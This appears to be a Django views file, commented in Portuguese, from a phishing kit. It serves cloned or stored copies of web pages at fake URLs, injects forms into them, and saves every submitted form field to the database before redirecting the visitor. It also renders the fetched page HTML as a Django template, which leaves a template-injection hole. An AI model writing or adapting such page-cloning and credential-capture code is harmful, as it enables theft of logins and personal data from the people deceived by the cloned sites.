from django.shortcuts import render, redirect, HttpResponse
from django.http import JsonResponse
from django.urls import reverse
from django.template import RequestContext, Template

from custom_admin.models import TemplateCopy, Account
from custom_admin.utils import auto_get_page, form_injection
import requests

import re

# Create your views here.
def home(request):
    return HttpResponse('')

def renderizator(request, url):
    """
    Responsável por renderizar o site em uma url dinamica
    """
    url = str(url)+'/' if str(url).endswith('/') is not True else url

    if request.method == 'POST':
        data = dict(request.POST)
        template = TemplateCopy.objects.get(url_fake=url)
        acc = Account.objects.create(template=template, datas=data)
        acc.save()

        return redirect(template.redirect or request.build_absolute_uri())
    
    else:
        try:
            template = TemplateCopy.objects.get(url_fake=url)
            html = template.content

            if template.copy_from_url == True:
                html = auto_get_page(template.url_clonar)
                if template.fazer_preload == True:
                    # Fazer preload
                    template.content = html
                    template.fazer_preload = False
                    template.copy_from_url = False
                    template.save()


            content = form_injection(html, template_copy=template)

            template = Template(content)
            context = RequestContext(request, {'URL': url})
            rendered_html = template.render(context)
            
            return HttpResponse(rendered_html)


        except (TemplateCopy.DoesNotExist):
            return redirect(reverse('home:home'))





